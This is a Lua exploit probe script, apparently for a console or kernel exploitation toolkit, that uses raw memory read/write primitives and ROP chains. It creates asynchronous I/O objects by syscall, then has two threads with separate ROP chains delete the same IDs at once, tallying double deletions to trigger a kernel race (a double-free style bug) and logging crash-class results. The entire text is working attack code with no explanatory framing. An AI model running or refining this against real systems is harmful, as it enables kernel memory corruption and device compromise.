-- CRASH_CLASS: HIGH
-- PROBE 632a: two loader threads deleting the same aio ids with per-thread ROP stubs
print("=== PROBE 632a: AIO RACE WITH LOADER THREADS ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end

local NIDS=8
local data=memory.alloc(0x2000)
local out=memory.alloc(0x40)
for i=0,0x1FFC,4 do wd(N(data)+i,0) end
for i=0,0x3C,4 do wd(N(out)+i,0) end
local sc669=mk(669) local sc664=mk(664) local sc662=mk(662)
local okc,rv=pcall(function() return sc669(uint64(0x1001),uint64(N(data)),uint64(NIDS),uint64(1),uint64(N(out))) end)
local base=rd(N(out))
print(string.format("[A] create rv=%s base=%s",tostring(okc and rv or "err"),tostring(base)))
if not base or base<=0 then print("[!] no object"); return end
local ids=memory.alloc(NIDS*4)
for i=0,NIDS-1 do wd(N(ids)+i*4, base + i*0x10000) end
local chk=memory.alloc(0x40)
local sc664b=mk(664)
local allp=true
for i=0,NIDS-1 do
    local o=pcall(function() return sc664(U(N(ids)+i*4),uint64(1),uint64(N(chk))) end)
    local st=rd(N(chk))
    if st~=3 and st~=0x10003 then allp=false end
end
print(string.format("[B] polled all=%s first=%s",tostring(allp),tostring(rd(N(chk)))))

local ROUNDS=20
local tA=thread.frame or nil
local SLOTS=ROUNDS*NIDS
local stA=memory.alloc(SLOTS*4)
local stB=memory.alloc(SLOTS*4)
for i=0,SLOTS*4-1,4 do wd(N(stA)+i,0x77777777) wd(N(stB)+i,0x77777777) end

local function build(stp)
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x40000})
    local sc=mk(662)
    for r=1,ROUNDS do
        for i=0,NIDS-1 do
            local slot=(r-1)*NIDS+i
            c:push_syscall_with_ret(sc, U(N(ids)+i*4), uint64(1), U(N(stp)+slot*4))
        end
    end
    return c
end
local ca=build(N(stA))
local cb=build(N(stB))
print("[C] chains built")
local ta=thread:new(ca)
local tb=thread:new(cb)
ta:run(true)
tb:run(true)
print("[D] launched")
ta:join()
tb:join()
print("[E] joined")
local za,zb,both=0,0,0
local perround={}
for r=1,ROUNDS do
    local b=0
    for i=0,NIDS-1 do
        local s0=(r-1)*NIDS+i
        local a=rd(N(stA)+s0*4) local bb=rd(N(stB)+s0*4)
        if a==0 and bb==0 then b=b+1 both=both+1 end
        if a==0 then za=za+1 end
        if bb==0 then zb=zb+1 end
    end
    perround[r]=b
end
print(string.format("[F] A zeros=%d B zeros=%d both=%d",za,zb,both))
local pl=""
for r=1,ROUNDS do pl=pl..string.format(" %d",perround[r]) end
print("[G] doubles per round:"..pl)
local hc=memory.alloc(0x40)
local h=0
for i=1,4 do
    local o1=pcall(function() return sc669(uint64(0x1001),uint64(N(data)),uint64(2),uint64(1),uint64(N(out))) end)
    local b2=rd(N(out))
    if b2 and b2>0 then
        wd(N(ids),b2)
        pcall(function() sc664(U(N(ids)),uint64(1),uint64(N(chk))) end)
        local o2,r2=pcall(function() return sc662(U(N(ids)),uint64(1),uint64(N(hc))) end)
        if o2 and N(r2)==0 and rd(N(hc))==0 then h=h+1 end
    end
end
print(string.format("[H] health=%d/4 alive=%d",h,N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] alive")
